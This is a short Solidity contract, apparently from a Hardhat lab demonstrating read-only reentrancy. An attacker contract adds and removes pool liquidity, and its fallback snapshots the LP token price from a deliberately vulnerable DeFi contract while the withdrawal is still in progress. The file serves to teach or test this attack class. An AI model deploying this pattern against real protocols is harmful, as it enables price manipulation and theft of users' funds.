//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "hardhat/console.sol";

import {ReadOnlyPool, VulnerableDeFiContract} from "./ReadOnly.sol";

contract ReadOnlyAttacker {
    address public immutable poolAddr;
    address public immutable defiAddr;

    constructor(address poolAddr_, address defiAddr_) payable {
        poolAddr = poolAddr_;
        defiAddr = defiAddr_;

        ReadOnlyPool(poolAddr_).addLiquidity{value: msg.value}();
    }

    function attack() external {
        ReadOnlyPool(poolAddr).removeLiquidity();
    }

    fallback() external payable {
        console.log("Attacker fallback.");
        console.log(VulnerableDeFiContract(defiAddr).lpTokenPrice());

        VulnerableDeFiContract(defiAddr).snapshotPrice();
    }
}
